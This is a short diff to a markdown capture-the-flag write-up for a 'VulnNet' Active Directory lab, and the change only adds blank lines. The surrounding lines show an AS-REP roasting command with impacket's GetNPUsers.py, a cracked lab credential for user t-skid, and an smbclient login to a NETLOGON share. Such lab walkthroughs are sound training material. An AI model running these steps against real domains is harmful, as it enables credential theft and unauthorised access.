@@ -116,7 +116,9 @@ j-leet
 ![Vuln.txt Content](/assets/img/htb/vulnnet/vulntxt.jpg)
 
 ## ✅ Step 4: AS-REP Roasting
-Some users do not require pre-authentication. We exploit this using:
+Some users do not require pre-authentication. 
+
+We exploit this using:
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile vuln.txt
 ```
@@ -142,6 +144,7 @@ t-skid : tj072889*
 
 ## ✅ Step 5: Lateral Movement
 Logged in as t-skid with SMB and found ResetPassword.vbs in NETLOGON share.
+
 Command:
 ```bash
 smbclient \\\\10.10.149.244\\NETLOGON -U vulnnet-rst.local\\t-skid
